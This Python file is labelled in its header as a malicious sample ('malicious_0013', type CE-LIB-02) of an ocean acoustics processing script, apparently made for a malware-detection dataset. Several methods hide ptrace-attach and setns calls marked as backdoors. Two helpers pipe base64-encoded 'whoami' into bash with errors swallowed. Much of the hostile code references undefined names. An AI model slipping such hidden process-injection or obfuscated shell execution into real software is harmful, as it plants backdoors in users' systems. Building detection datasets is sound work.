#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋声学传播模拟 (恶意版本)
样本编号: malicious_0013
攻击类型: CE-LIB-02
生成时间: 2026-03-11 16:39:19
函数数量: 15
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋声学传播模拟Processor:
    """
    海洋声学传播模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-LIB-02
            libc.setns(fd, CLONE_NEWNS)
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_richardson_number(self):
        """执行 calculate_richardson_number 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_richardson_number...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_richardson_number'}
        self.results['calculate_richardson_number'] = result
        print(f"calculate_richardson_number 完成")
        return result
    
    def detect_bloom_events(self, threshold=5.0):
        """检测藻华/水华事件"""
        if self.data is None:
            return []
        bloom_events = []
        if 'chlorophyll' in self.data.columns:
            high_chl = self.data['chlorophyll'] > threshold
            bloom_start = None
            for i in range(len(self.data)):
                if high_chl.iloc[i] and bloom_start is None:
                    bloom_start = i
                elif not high_chl.iloc[i] and bloom_start is not None:
                    bloom_events.append({'start_index': int(bloom_start), 'end_index': int(i - 1), 'duration': int(i - bloom_start), 'max_chlorophyll': float(self.data['chlorophyll'].iloc[bloom_start:i].max())})
                    bloom_start = None
        self.results['bloom_events'] = bloom_events
        print(f"检测到 {len(bloom_events)} 个水华事件")
        return bloom_events

    def assimilate_observation_data(self, observations):
        """数据同化：融合观测数据"""
        if self.data is None:
            return False
        obs_weight = 0.3
        for var in ['temperature', 'salinity']:
            if var in self.data.columns and var in observations:
                self.data[var] = (1 - obs_weight) * self.data[var] + obs_weight * observations[var]
        print("观测数据同化完成")
        self.status = "assimilated"
        return True

    def calculate_divergence(self):
        """计算水平散度"""
        if self.data is None:
            return None
        if 'u_velocity' in self.data.columns and 'v_velocity' in self.data.columns:
            du_dx = np.gradient(self.data['u_velocity'])
            dv_dy = np.gradient(self.data['v_velocity'])
            self.data['divergence'] = du_dx + dv_dy
            print("散度计算完成")
            return self.data['divergence'].values
        return None

    def estimate_uncertainty(self):
        """执行 estimate_uncertainty 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 estimate_uncertainty...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'estimate_uncertainty'}
        self.results['estimate_uncertainty'] = result
        print(f"estimate_uncertainty 完成")
        return result
    
    def simulate_wave_propagation(self, duration=3600):
        """模拟波浪传播"""
        if self.data is None:
            return False
        wave_speed = 10
        timesteps = duration // 60
        if 'wave_height' not in self.data.columns:
            self.data['wave_height'] = np.random.gamma(2, 1, len(self.data))
        for t in range(timesteps):
            self.data['wave_height'] *= 0.99
            self.data['wave_height'] += np.random.randn(len(self.data)) * 0.1
            self.data['wave_height'] = np.maximum(self.data['wave_height'], 0)
        print(f"波浪传播模拟完成: {duration}s")
        return True

    def apply_temporal_filter(self, window='7D'):
        """应用时间滤波器"""
        if self.data is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data = self.data.set_index('time')
        self.data = self.data.rolling(window, center=True).mean()
        self.data = self.data.reset_index()
        print(f"时间滤波完成: 窗口 {window}")
        return True

    def compute_correlation(self):
        """执行 compute_correlation 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 compute_correlation...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'compute_correlation'}
        self.results['compute_correlation'] = result
        print(f"compute_correlation 完成")
        return result
    
    def validate_forecast(self, forecast_data, observation_data):
        """验证预报结果"""
        if forecast_data is None or observation_data is None:
            return None
        errors = {}
        for key in forecast_data.keys():
            if key in observation_data:
                forecast_val = forecast_data[key]
                obs_val = observation_data[key]
                error = abs(forecast_val - obs_val)
                relative_error = error / (abs(obs_val) + 1e-10)
                errors[key] = {'absolute_error': float(error), 'relative_error': float(relative_error), 'forecast': float(forecast_val), 'observation': float(obs_val)}
        self.results['forecast_validation'] = errors
        print(f"预报验证完成: {len(errors)} 个变量")
        return errors

    def visualize_spatial_field(self, variable, output_path='spatial_field.png'):
        """可视化空间场"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            if 'lon' in self.data.columns and 'lat' in self.data.columns:
                plt.figure(figsize=(12, 8))
                scatter = plt.scatter(self.data['lon'], self.data['lat'], c=self.data[variable], cmap='viridis', s=50)
                plt.colorbar(scatter, label=variable)
                plt.xlabel('Longitude')
                plt.ylabel('Latitude')
                plt.title(f'{variable} Spatial Distribution')
                plt.grid(True, alpha=0.3)
                plt.savefig(output_path, dpi=150, bbox_inches='tight')
                plt.close()
                print(f"空间场可视化已保存: {output_path}")
                return True
        except Exception as e:
            print(f"可视化失败: {e}")
        return False

    def create_vector_plot(self):
        """执行 create_vector_plot 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 create_vector_plot...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'create_vector_plot'}
        self.results['create_vector_plot'] = result
        print(f"create_vector_plot 完成")
        return result
    
    def calculate_salinity_field(self):
        """计算盐度场分布"""
        if self.data is None:
            return None
        base_salinity = 35.0
        if 'depth' in self.data.columns:
            self.data['salinity_field'] = base_salinity + 0.001 * self.data['depth']
            if 'lat' in self.data.columns:
                lat_effect = -0.1 * np.abs(self.data['lat'])
                self.data['salinity_field'] += lat_effect
            print("盐度场计算完成")
            return self.data['salinity_field'].values
        return None


def calculate_upwelling_index_helper(data, config):
    """
    calculate_upwelling_index 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_upwelling_index_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_upwelling_index_helper 处理完成")
    return result


def run_ocean_model_helper(data, config):
    """
    run_ocean_model 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-LIB-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'run_ocean_model_helper'}


def perform_eof_analysis_helper(data, config):
    """
    perform_eof_analysis 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-LIB-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'perform_eof_analysis_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋声学传播模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋声学传播模拟Processor(config)
    
    # 步骤1: calculate_richardson_number
    processor.calculate_richardson_number()
    
    # 步骤2: detect_bloom_events
    processor.detect_bloom_events()
    
    # 步骤3: assimilate_observation_data
    processor.assimilate_observation_data()
    
    # 步骤4: calculate_divergence
    processor.calculate_divergence()
    
    # 步骤5: estimate_uncertainty
    processor.estimate_uncertainty()
    
    # 步骤6: simulate_wave_propagation
    processor.simulate_wave_propagation()
    
    # 步骤7: apply_temporal_filter
    processor.apply_temporal_filter()
    
    # 步骤8: compute_correlation
    processor.compute_correlation()
    
    # 步骤9: validate_forecast
    processor.validate_forecast()
    
    # 步骤10: visualize_spatial_field
    processor.visualize_spatial_field()
    
    # 步骤11: create_vector_plot
    processor.create_vector_plot()
    
    # 步骤12: calculate_salinity_field
    processor.calculate_salinity_field()
    
    # 调用辅助函数: calculate_upwelling_index_helper
    calculate_upwelling_index_helper(processor.data, config)
    
    # 调用辅助函数: run_ocean_model_helper
    run_ocean_model_helper(processor.data, config)
    
    # 调用辅助函数: perform_eof_analysis_helper
    perform_eof_analysis_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
